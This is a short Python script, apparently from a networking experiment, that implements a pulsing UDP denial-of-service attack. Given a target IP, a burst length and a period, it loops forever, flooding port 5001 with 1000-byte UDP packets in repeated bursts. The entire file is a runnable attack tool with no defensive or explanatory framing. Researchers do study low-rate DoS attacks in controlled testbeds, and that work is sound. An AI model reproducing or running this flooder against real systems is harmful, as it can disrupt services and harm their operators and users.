#!/usr/bin/python

from argparse import ArgumentParser
import socket
from time import time, sleep

parser = ArgumentParser(description="Attacker Argument parser")
parser.add_argument('--period', '-p',
                    dest="period",
                    type=float,
                    action="store",
                    help="Period of the DoS attack",
                    required=True)

parser.add_argument('--length', '-l',
                    dest="length",
                    type=float,
                    action="store",
                    help="Length of attack burst in s",
                    required=True)
parser.add_argument('--destIP', '-d',
                    dest="ip",
                    action="store",
                    required=True)

args = parser.parse_args()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
MSG = '0' * 1000

while True:
    now = time()
    while time() - now < args.length:
        s.sendto(MSG, (args.ip, 5001))
    sleep(args.period)
